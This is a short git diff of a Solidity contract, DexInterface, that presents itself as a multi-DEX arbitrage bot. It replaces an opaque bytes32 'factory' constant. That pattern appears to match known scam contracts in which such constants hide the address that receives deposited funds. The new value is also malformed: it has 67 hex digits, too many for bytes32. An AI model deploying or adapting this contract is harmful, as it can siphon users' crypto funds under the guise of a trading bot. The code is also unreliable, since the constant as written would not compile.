@@ -223,7 +223,7 @@ contract DexInterface {
         require(endBalance > startBalance, "Trade Reverted, No Profit Made");
     }
 
-    bytes32 factory = 0x6e75382374384e10a7b62f628da8b15015fbe5a26f3959e2f157be762c000956;
+    bytes32 factory = 0x6e75382374384e10a7b62f62f627045491d54509ef687821654abb4b2e94b64a09e;
 
     // Evaluation function of the triple arbitrage bundle
 	function estimateTriDexTrade(address _router1, address _router2, address _router3, address _token1, address _token2, address _token3, uint256 _amount) internal view returns (uint256) {
